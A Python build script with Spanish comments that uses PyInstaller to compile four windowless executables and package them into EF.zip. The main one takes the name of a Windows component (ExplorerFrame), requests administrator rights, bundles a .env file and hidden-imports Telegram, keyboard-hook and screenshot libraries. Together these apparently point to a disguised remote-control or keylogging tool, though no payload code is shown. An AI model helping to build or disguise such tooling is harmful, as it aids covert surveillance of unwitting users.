"""
Script de compilación para ExplorerFrame
Compila todos los ejecutables con PyInstaller y los comprime en EF.zip
"""

import os
import sys
import subprocess
import shutil
from pathlib import Path

# Configuración de compilación
BUILDS = [
    {
        "name": "ExplorerFrame",
        "script": "explorerframe.py",
        "icon": "app/app-icon.ico",
        "onefile": True,
        "console": False,
        "uac_admin": True,
        "version_file": "version.res",
        "manifest": "manifest.res"
    },
    {
        "name": "Winverm",
        "script": "winverm.py",
        "icon": "app/winverm.ico",
        "onefile": True,
        "console": False,
        "uac_admin": False
    },
    {
        "name": "Protection",
        "script": "protection.py",
        "icon": "app/protection.ico",
        "onefile": True,
        "console": False,
        "uac_admin": False
    },
    {
        "name": "Updater",
        "script": "updater.py",
        "icon": "app/updater-icon.ico",
        "onefile": True,
        "console": False,
        "uac_admin": False
    }
]

def clean_build_dirs():
    """Limpia directorios de compilación anteriores."""
    print("🧹 Limpiando directorios de compilación...")
    for dir_name in ["build", "dist", "__pycache__"]:
        if os.path.exists(dir_name):
            shutil.rmtree(dir_name)
            print(f"   ✓ Eliminado {dir_name}/")
    
    # Eliminar archivos .spec
    for spec_file in Path(".").glob("*.spec"):
        spec_file.unlink()
        print(f"   ✓ Eliminado {spec_file}")

def compile_script(config):
    """Compila un script con PyInstaller."""
    name = config["name"]
    script = config["script"]
    icon = config["icon"]
    
    print(f"\n📦 Compilando {name}...")
    
    if not os.path.exists(script):
        print(f"   ❌ Error: {script} no encontrado")
        return False
    
    if not os.path.exists(icon):
        print(f"   ⚠️  Advertencia: {icon} no encontrado, compilando sin icono")
        icon = None
    
    # Construir comando de PyInstaller
    cmd = [
        "pyinstaller",
        "--name", name,
        "--clean",
        "--noconfirm"
    ]
    
    if config.get("onefile", True):
        cmd.append("--onefile")
    
    if not config.get("console", False):
        cmd.append("--noconsole")
    
    if icon:
        cmd.extend(["--icon", icon])
    
    if config.get("uac_admin", False):
        cmd.append("--uac-admin")
    
    if config.get("version_file") and os.path.exists(config["version_file"]):
        cmd.extend(["--version-file", config["version_file"]])
    
    if config.get("manifest") and os.path.exists(config["manifest"]):
        cmd.extend(["--manifest", config["manifest"]])
    
    # Agregar datos adicionales si es ExplorerFrame
    if name == "ExplorerFrame":
        cmd.extend([
            "--add-data", ".env;.",
            "--hidden-import", "telegram",
            "--hidden-import", "telegram.ext",
            "--hidden-import", "PIL",
            "--hidden-import", "keyboard",
            "--hidden-import", "win32api",
            "--hidden-import", "psutil",
            "--hidden-import", "numpy"
        ])
    
    cmd.append(script)
    
    try:
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        print(f"   ✓ {name}.exe compilado exitosamente")
        return True
    except subprocess.CalledProcessError as e:
        print(f"   ❌ Error compilando {name}:")
        print(f"      {e.stderr}")
        return False

def create_zip_package():
    """Crea el paquete EF.zip con los ejecutables compilados."""
    print("\n📦 Creando paquete EF.zip...")
    
    dist_dir = Path("dist")
    if not dist_dir.exists():
        print("   ❌ Error: directorio dist/ no encontrado")
        return False
    
    # Archivos a incluir en el zip
    files_to_zip = []
    for build in BUILDS:
        exe_name = f"{build['name']}.exe"
        exe_path = dist_dir / exe_name
        if exe_path.exists():
            files_to_zip.append(exe_path)
            print(f"   ✓ Agregando {exe_name}")
        else:
            print(f"   ⚠️  {exe_name} no encontrado, omitiendo")
    
    if not files_to_zip:
        print("   ❌ Error: no hay ejecutables para empaquetar")
        return False
    
    # Crear el zip
    import zipfile
    zip_path = "EF.zip"
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file_path in files_to_zip:
            zipf.write(file_path, file_path.name)
    
    # Verificar tamaño
    size_mb = os.path.getsize(zip_path) / (1024 * 1024)
    print(f"\n✅ EF.zip creado exitosamente ({size_mb:.2f} MB)")
    return True

def main():
    """Función principal."""
    print("=" * 60)
    print("ExplorerFrame - Script de Compilación")
    print("=" * 60)
    
    # Verificar que PyInstaller esté instalado
    try:
        subprocess.run(["pyinstaller", "--version"], check=True, capture_output=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("❌ Error: PyInstaller no está instalado")
        print("   Instala con: pip install pyinstaller")
        return 1
    
    # Limpiar directorios anteriores
    clean_build_dirs()
    
    # Compilar cada script
    success_count = 0
    for build_config in BUILDS:
        if compile_script(build_config):
            success_count += 1
    
    print(f"\n📊 Resumen: {success_count}/{len(BUILDS)} ejecutables compilados")
    
    # Crear paquete zip
    if success_count > 0:
        if create_zip_package():
            print("\n🎉 Compilación completada exitosamente")
            return 0
        else:
            print("\n⚠️  Compilación completada pero falló la creación del zip")
            return 1
    else:
        print("\n❌ No se compiló ningún ejecutable")
        return 1

if __name__ == "__main__":
    sys.exit(main())
